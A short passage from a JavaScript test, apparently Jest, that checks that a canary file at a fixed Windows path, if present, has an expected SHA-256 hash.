    const canaryPath = 'C:\\maos\\rust\\test.txt';
    if (fs.existsSync(canaryPath)) {
      const content = fs.readFileSync(canaryPath);
      const hash = crypto.createHash('sha256').update(content).digest('hex');
      expect(hash).toBe(CANARY_HASH);
    }
  });
});
